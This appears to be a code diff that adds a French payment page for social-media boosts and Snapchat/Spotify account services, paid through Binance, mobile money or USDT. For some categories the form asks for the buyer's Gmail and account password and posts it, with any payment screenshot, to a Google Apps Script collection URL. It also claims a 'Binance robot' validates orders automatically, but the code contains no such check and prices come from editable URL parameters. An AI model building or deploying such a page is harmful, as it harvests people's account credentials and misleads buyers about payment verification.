@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement Sécurisé</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #28a745; --blue: #2196f3; --bg: #f4f6f8; }
+        body { font-family: 'Poppins', sans-serif; background: var(--bg); display: flex; justify-content: center; padding: 15px; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 20px; width: 100%; max-width: 450px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+        h2 { text-align: center; color: #333; margin-bottom: 5px; }
+        .price { font-size: 28px; color: var(--primary); font-weight: bold; text-align: center; margin: 15px 0; }
+        .desc-box { background: #e3f2fd; border-left: 4px solid var(--blue); border-radius: 8px; margin-bottom: 15px; }
+        summary { padding: 10px; cursor: pointer; font-weight: bold; color: #0d47a1; font-size: 13px; outline: none; }
+        .desc-content { padding: 0 10px 10px; font-size: 13px; color: #444; max-height: 100px; overflow-y: auto; white-space: pre-wrap; }
+        label { display: block; margin-top: 15px; font-weight: 600; font-size: 14px; color: #555; }
+        input { width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 15px; }
+        .pay-info { background: #fff3cd; border: 1px solid #ffecb5; padding: 15px; border-radius: 10px; font-size: 12px; margin-top: 20px; line-height: 1.6; }
+        .btn { background: var(--primary); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; transition: 0.3s; }
+        .btn:disabled { background: #ccc; }
+        .hidden { display: none; }
+        .success { text-align: center; color: var(--primary); animation: fadeIn 0.5s; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="loader" class="hidden" style="text-align:center;">Chargement...</div>
+    
+    <div id="form-container">
+        <h2 id="service-name">Service</h2>
+        <p id="service-id" style="text-align:center; color:#999; font-size:11px; margin:0;"></p>
+
+        <details class="desc-box" id="desc-ui">
+            <summary>📄 Description & Instructions</summary>
+            <div class="desc-content" id="service-desc"></div>
+        </details>
+
+        <form id="orderForm">
+            <label id="input-label">Information requise</label>
+            <input type="text" id="main-input" required placeholder="...">
+
+            <div id="qty-box" class="hidden">
+                <label>Quantité</label>
+                <input type="number" id="qty" value="1000" min="10">
+            </div>
+
+            <div class="price" id="display-price">0.00 $</div>
+
+            <div class="pay-info">
+                <strong>💳 MOYENS DE PAIEMENT :</strong><br>
+                🔸 Binance Pay ID : <strong>744370418</strong><br>
+                🔴 Airtel (RDC) : 0971028041 (YVETTE)<br>
+                🔵 Wave (CI) : +2250546247885 (600 XAF)<br>
+                💲 USDT (TRC20) : <small>TN6c8PCwF1TU2XKPFDsGHw1fgen1MTRGka</small><br>
+                <strong>⚠️ IMPORTANT :</strong> Notez l'ID de commande sur Binance pour validation automatique.
+            </div>
+
+            <label>📸 Preuve de paiement (Optionnel si ID noté)</label>
+            <input type="file" id="file" accept="image/*">
+
+            <button type="submit" class="btn" id="submitBtn">VALIDER LA COMMANDE</button>
+        </form>
+    </div>
+
+    <div id="success-msg" class="hidden success">
+        <h3>✅ Commande Enregistrée !</h3>
+        <p>Numéro de commande :</p>
+        <div id="order-id-display" style="font-size:22px; font-weight:bold; color:#0d6efd; background:#e7f1ff; padding:10px; border-radius:10px; border:2px dashed #0d6efd;"></div>
+        <p style="font-size:12px; color:#666; margin-top:15px;">Le robot Binance validera votre accès d'ici 5 minutes.</p>
+    </div>
+</div>
+
+<script>
+    // Récupérer l'URL Google Apps Script (À REMPLACER PAR TON LIEN EXEC)
+    const GOOGLE_URL = "URL_DE_TON_DEPLOYEMENT_GOOGLE";
+
+    const params = new URLSearchParams(window.location.search);
+    const nom = params.get('nom') || "Service";
+    const prix = params.get('prix') || "0";
+    const cat = params.get('cat') || "";
+    const id = params.get('id') || "";
+    const desc = params.get('desc') || "";
+
+    document.getElementById('service-name').innerText = nom;
+    document.getElementById('service-id').innerText = "ID: " + id;
+    document.getElementById('service-desc').innerText = desc;
+    document.getElementById('display-price').innerText = prix + " $";
+
+    if(!desc) document.getElementById('desc-ui').classList.add('hidden');
+    if(cat.startsWith('Boost')) document.getElementById('qty-box').classList.remove('hidden');
+
+    // Adapter les labels
+    if(cat === 'Snapchat') document.getElementById('input-label').innerText = "Gmail + Mot de passe Snap";
+    else if(cat === 'Spotify') document.getElementById('input-label').innerText = "Gmail + Mot de passe Spotify";
+    else if(cat === 'Carte') document.getElementById('input-label').innerText = "Votre Email de livraison";
+
+    document.getElementById('orderForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "Envoi en cours...";
+
+        const file = document.getElementById('file').files[0];
+        let fileData = "";
+        if(file) {
+            const reader = new FileReader();
+            fileData = await new Promise(res => {
+                reader.onload = e => res(e.target.result);
+                reader.readAsDataURL(file);
+            });
+        }
+
+        const orderId = "#CMD-" + Math.floor(1000 + Math.random() * 9000);
+
+        const data = {
+            orderId: orderId,
+            produit: nom,
+            idService: id,
+            categorie: cat,
+            input1: document.getElementById('main-input').value,
+            quantite: document.getElementById('qty').value,
+            total: document.getElementById('display-price').innerText,
+            fileData: fileData
+        };
+
+        fetch(GOOGLE_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data)
+        }).then(() => {
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('order-id-display').innerText = orderId;
+            document.getElementById('success-msg').classList.remove('hidden');
+        });
+    };
+</script>
+
+</body>
+</html>
